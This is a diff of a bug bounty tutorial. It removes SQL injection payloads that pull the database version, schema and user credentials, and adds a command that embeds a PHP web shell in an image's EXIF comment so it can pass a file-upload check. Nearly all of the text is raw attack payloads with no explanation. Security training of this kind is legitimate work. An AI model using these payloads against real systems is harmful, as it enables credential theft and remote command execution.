@@ -3,11 +3,8 @@ bug bounty tutorial
 
 ## 3.intro bug bounty
 ```
-' OR 1=1 #
-1' OR 1=1 UNION SELECT 1, VERSION()#
-1' OR 1=1 UNION SELECT 1,DATABASE() #
+apt-get install exiftools
 
-1' OR 1=1 UNION SELECT 1, column_name FROM information_schema.columns WHERE table_name='users' #
+exiftools -Comment="<?php echo system(\$_GET["cmd"]); ?>" image_name
 
-1' OR 1=1 UNION SELECT user, password FROM users #
 ```
